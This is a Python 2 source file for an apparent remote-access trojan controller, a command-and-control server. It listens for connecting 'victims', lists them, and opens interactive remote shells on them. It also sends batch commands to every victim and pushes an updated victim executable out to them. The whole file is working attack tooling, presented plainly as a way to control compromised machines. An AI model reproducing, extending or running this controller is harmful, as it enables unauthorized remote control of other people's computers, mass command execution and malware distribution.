#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import os
import socket
import errno
import threading
import select
import time
import re
import termios
import fcntl
import struct
import signal

# LOG LEVEL
LOG_INFO = 1
LOG_OK   = 2
LOG_WARN = 3
LOG_ERR  = 4

# Contrller socket id
cntlsock = -1
# Victims list
victims = []


# Print logs on console.
def log (text, level):
    global LOG_INFO, LOG_OK, LOG_WARN, LOG_ERR

    # text color
    T_INFOGREEN = '\033[92m'
    T_OKBLUE    = '\033[94m'
    T_WARNING   = '\033[93m'
    T_ERROR     = '\033[91m'
    T_END       = '\033[0m'

    try:
        text = {
            LOG_INFO: T_INFOGREEN + 'INFO: ' + text + T_END,
            LOG_OK  : T_OKBLUE + 'NOTE: ' + text + T_END,
            LOG_WARN: T_WARNING + 'WARN: ' + text + T_END,
            LOG_ERR : T_ERROR + 'ERR:  ' + text + T_END,
        } [level]

    except KeyError:
        text = T_ERROR + 'ERR:  Invalid log function call' + T_END 

    print(text)


# List all online victims.
def print_victims ():
    global victims

    for i in range(len(victims)):
        print("%s. %s" % (i+1, victims[i][1]))


# Kickout all victims.
def clear_victims ():
    global victims

    for victim in victims:
        try:
            victim[0].shutdown(2)
            victim[0].close()
            victims.remove(victim)
        except:
            pass

    victims = []


# Validate nick.
def illegal_nick (nick):
    return ((len(nick)==0) or (len(nick)>=50) or ('|' in nick) or (' ' in nick)) and True or False


# Check uid if exist in list.
def uid_in_list (uid):
    global victims

    for i in range(len(victims)):
        if uid == victims[i][1]:
            return True

    return False


# Get terminal width & height.
def get_term_size ():

    def ioctl_GWINSZ(fd):
        try:
            cr = struct.unpack('hh', fcntl.ioctl(fd, termios.TIOCGWINSZ, '1234'))
        except:
            return
        return cr

    cr = ioctl_GWINSZ(0) or ioctl_GWINSZ(1) or ioctl_GWINSZ(2)
    if not cr:
        try:
            fd = os.open(os.ctermid(), os.O_RDONLY)
            cr = ioctl_GWINSZ(fd)
            os.close(fd)
        except:
            pass

    if not cr:
        env = os.environ
        cr = (env.get('LINES', 25), env.get('COLUMNS', 80))

    return int(cr[0]), int(cr[1])  # width,height


# Self-defined send call.
def wsend (sock, data):

    datalen = struct.pack('i', len(data))
    sock.sendall('%s' % datalen)
    sock.sendall(data)


# Self-defined recv call.
def wrecv (sock):
    # recv data len
    datalen = sock.recv(4)
    datalen = struct.unpack('i', datalen)[0]
    # recv data
    data = sock.recv(datalen)
    return data


# This thread checks victim status.
class ThreadStatus (threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)
        self.kill_received = False

    def run(self):
        global victims

        while not self.kill_received:
            for victim in victims:
                vicsock   = victim[0]
                try:
                    chk_cmd = struct.pack('12s', 'check_status')
                    wsend(vicsock, chk_cmd)
                except Exception:
                    try:
                        print ''
                        print '%s downline...' % victim[1]
                        vicsock.shutdown(2)
                        vicsock.close()
                    except:
                        pass
                    finally:
                        victims.remove(victim)

            # one-rotate-check every 5s
            time.sleep(5)


# This thread binds cntl and admits victims.
class ThreadWorker (threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)
        self.kill_received = False

    def run(self):
        global cntlsock, victims

        # local IP and PORT
        cntlip   = '0.0.0.0'
        cntlport = 433

        cntlsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        cntlsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        cntlsock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

        # trying to bind IP and PORT
        try:
            cntlsock.bind((cntlip, cntlport))
        except socket.error, v:
            errorcode = v[0]
            if errorcode in (errno.EPERM, errno.EACCES):
                log('You need to run it as root.', LOG_ERR)
            elif errorcode == errno.EADDRINUSE:
                log('The port already in use.', LOG_ERR)
            else:
                log('bind failed.', LOG_ERR)

            cntlsock.close()
            sys.exit(1)

        # listen
        cntlsock.listen(5)
        log('listening on '+ cntlip + ':' + str(cntlport), LOG_INFO)

        # try connection with victims.
        while not self.kill_received:
            rr, rw, err = select.select([cntlsock], [], [], 1)
            if rr:
                vicsock, vicaddr = cntlsock.accept()

                # get auth token from victim
                vicsock.settimeout(5)
                try:
                    authtoken = wrecv(vicsock)
                except Exception, e:
                    vicsock.shutdown(2)
                    vicsock.close()
                    continue

                vicsock.settimeout(None)

                if (authtoken <> 'helloserver'):
                    vicsock.shutdown(2)
                    vicsock.close()
                    continue

                # get nick from victim
                nick = wrecv(vicsock)
                uid = nick + '|' + vicaddr[0] + '|' + str(vicaddr[1])

                if (illegal_nick(nick) or uid_in_list(uid)):
                    vicsock.shutdown(2)
                    vicsock.close()
                    continue

                # send uid ok receipt
                uid_ok_receipt = struct.pack('6s', 'uid_ok')
                wsend(vicsock, uid_ok_receipt)

                # victim authorized
                vicsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                vicsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                vicsock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

                print ''
                print '%s upline...' % uid
                victims.append((vicsock, uid))

        clear_victims()
        cntlsock.shutdown(2)
        cntlsock.close()


# Usage help.
def usage():
    log('>>>\n'
        '\tLISTV:       print online victims\n'
        '\tGETV <vid>:  get the victim shell, <vid> is the victim id\n'
        '\tBATCHV:      enter batch command console, sending command to online victims\n'
        '\tSHUTV <vid>: kill the victim, <vid> is the victim id\n'
        '\tUPGRADEV:    upgrade the victims, upgrade filename is vict in current folder\n'
        '\tHELP:        print this message\n'
        '\tEXITC:       exit the controller', LOG_WARN)


# Get victim terminal.
def attach_victim (vicsock):

    # send terminal size to victim
    def sendws():
        ctlwsrow, ctlwscol = get_term_size()

        data = struct.pack('2i2x2s', ctlwsrow, ctlwscol, 0xFF, 0xFF, 's', 's')
        wsend(vicsock, data)

    ctlwsrow, ctlwscol = get_term_size()
    ctlterm = 'TERM=' + os.environ['TERM']

    # pack winsize & TERM data
    data = struct.pack('2i%ds'%len(ctlterm), ctlwsrow, ctlwscol, ctlterm)
    wsend(vicsock, data)

    # register SIGWINCH handler
    signal.signal(signal.SIGWINCH, sendws)

    # set cntl stdin console
    pid = os.getpid()
    slave = 0
    pty = open(os.readlink('/proc/%d/fd/%d' % (pid, slave)), 'rb+')

    oldtermios = termios.tcgetattr(pty)
    newattr = termios.tcgetattr(pty)

    newattr[0] |= termios.IGNPAR
    newattr[0] &= ~(termios.ISTRIP|termios.INLCR|termios.IGNCR|termios.ICRNL|termios.IXON|termios.IXANY|termios.IXOFF)
    newattr[3] &= ~(termios.ISIG|termios.ICANON|termios.ECHO|termios.ECHOE|termios.ECHOK|termios.ECHONL|termios.IEXTEN)
    newattr[1] &= ~termios.OPOST
    newattr[6][termios.VMIN] = 1
    newattr[6][termios.VTIME] = 0

    termios.tcsetattr(pty, termios.TCSADRAIN, newattr)

    oldflags = fcntl.fcntl(pty, fcntl.F_GETFL)
    fcntl.fcntl(pty, fcntl.F_SETFL, oldflags|os.O_NONBLOCK)

    while True:
        rr, rw, err = select.select([pty,vicsock], [], [], 1)
        if not (rr or rw or err):
            continue

        for s in rr:
            if s is vicsock:
                try:
                    data = wrecv(vicsock)
                    if data == 'shell_exit_ok':
                        termios.tcsetattr(pty, termios.TCSAFLUSH, oldtermios)
                        fcntl.fcntl(pty, fcntl.F_SETFL, oldflags)
                        print ''
                        return
                    if data == 'check_status':
                        continue

                    pty.write(data)
                    pty.flush()
                except Exception, e:
                    termios.tcsetattr(pty, termios.TCSAFLUSH, oldtermios)
                    fcntl.fcntl(pty, fcntl.F_SETFL, oldflags)
                    print ''
                    return

            elif s is pty:
                try:
                    data = pty.read(8192)
                    data = struct.pack('%ds'%len(data), data)
                    wsend(vicsock, data)
                except Exception, e:
                    termios.tcsetattr(pty, termios.TCSAFLUSH, oldtermios)
                    fcntl.fcntl(pty, fcntl.F_SETFL, oldflags)
                    print ''
                    return

# Launch batch command to victims.
def batch_command_victims():
    global victims

    log('>>>\n'
        '\tType command and press enter, sending it to victims.\n'
        '\tType quitbc, returning controller console.\n', LOG_OK)

    vcmd = ''
    while vcmd.lower() != 'quitbc':
        sys.stdout.write('=> ')
        sys.stdout.flush()

        vcmd = sys.stdin.readline().strip('\r').strip('\n').strip()
        if len(vcmd) == 0 or vcmd.lower() == 'quitbc':
            continue

        for victim in victims:
            # label command with 'batch_command ' ahead
            pvcmd = 'batch_command ' + vcmd
            pvcmd = struct.pack('%ds' % len(pvcmd), pvcmd)
            wsend(victim[0], pvcmd)
            # receive command result from victim
            data = wrecv(victim[0])
            data = data.rstrip()
            if len(data) == 0:
                continue
            print 'result from %s:' % victim[1]
            print data
            print ''

# Send out victim executable.
def send_victim_exe(vicsock):
    update_file = 'vict'
    print 'filename: %s, filesize: %d, fnamelen: %d' % (update_file, os.stat(update_file).st_size, len(update_file))

    # send file name
    fname = struct.pack('%ds' % len(update_file), update_file)
    wsend(vicsock, fname)

    # send file size
    fsize = struct.pack('i', os.stat(update_file).st_size)
    wsend(vicsock, fsize)

    # send file mode
    fmode = struct.pack('i', os.stat(update_file).st_mode)
    wsend(vicsock, fmode)

    # send file
    sendsize  = 0
    totalsize = os.stat(update_file).st_size
    fo        = open(update_file, 'rb')
    # begin send
    while sendsize != totalsize:
        filedata = fo.read(1024)
        if not filedata:
            break
        vicsock.sendall(filedata)
        sendsize += len(filedata)

    fo.close()


# Main.
if __name__ == '__main__':

    # default selector -1 for main thread
    selector = -1
    prompt   = 'cntl# '

    # setup cntl and wait for victims
    wrk = ThreadWorker()
    wrk.setDaemon(True)
    wrk.start()

    # fork new thread for victim check
    vck = ThreadStatus()
    vck.setDaemon(True)
    vck.start()

    usage()
    time.sleep(0.5)
    try:
        while (wrk.is_alive()):
            # main thread for command process
            sys.stdout.write(prompt)
            sys.stdout.flush()

            cmd = sys.stdin.readline().strip('\r').strip('\n').strip()

            # only press enter
            if len(cmd) == 0:
                continue
            # list victims
            elif cmd.lower() == 'listv':
                print_victims()

            # launch batch command to victims, entering interactive console
            elif cmd.lower() == 'batchv':
                batch_command_victims()

            # help usage
            elif cmd.lower() == 'help':
                usage()

            # exit the cntl
            elif cmd.lower() == 'exitc':
                vck.kill_received = True
                wrk.kill_received = True
                break

            # upgrade victim execution
            elif cmd.lower() == 'upgradev':
                for victim in victims:
                    pcmd = 'upgrade_victim'
                    pcmd = struct.pack('%ds' % len(pcmd), pcmd)
                    wsend(victim[0], pcmd)
                    send_victim_exe(victim[0])

            # attach a victim console
            elif (re.match(r'^\s*getv\s+(\d+)\s*$', cmd.lower(), re.I)):
                selector = (int)(re.match(r'^\s*getv\s+(\d+)\s*$', cmd.lower(), re.I).group(1)) - 1
                # get victim
                try:
                    vicsock  = victims[selector][0]
                    sent_cmd = struct.pack('10s', 'get_victim')
                    wsend(vicsock, sent_cmd)
                    attach_victim(vicsock)
                except Exception:
                    log('You are trying to GET non-exist victim.', LOG_ERR)
                    continue
                finally:
                    selector = -1

            # shutdown a victim, only in control console
            elif (re.match(r'^\s*shutv\s+(\d+)\s*$', cmd.lower(), re.I)):
                if (selector <> -1):
                    log('You can only shutdown victim in control console.', LOG_ERR)
                    continue

                selector = (int)(re.match(r'^\s*shutv\s+(\d+)\s*$', cmd.lower(), re.I).group(1)) - 1
                try:
                    vicsock  = victims[selector][0]
                    victuple = victims[selector]
                    sent_cmd = struct.pack('15s', 'shutdown_victim')
                    wsend(vicsock, sent_cmd)

                    log(victims[selector][1]+' dropped.', LOG_OK)

                    try:
                        vicsock.shutdown(2)
                        vicsock.close()
                        victims.remove(victuple)
                    except:
                        pass

                except Exception:
                    log('You are trying to shutdown non-exist victim.', LOG_ERR)
                    continue
                finally:
                    # reset to control console
                    selector = -1

            # execute local command
            else:
                os.system(cmd)

        sys.exit(0)

    except (KeyboardInterrupt):
        vck.kill_received = True
        wrk.kill_received = True

        print('\n'),
        log('You pressed Ctrl-C to exit.', LOG_OK)
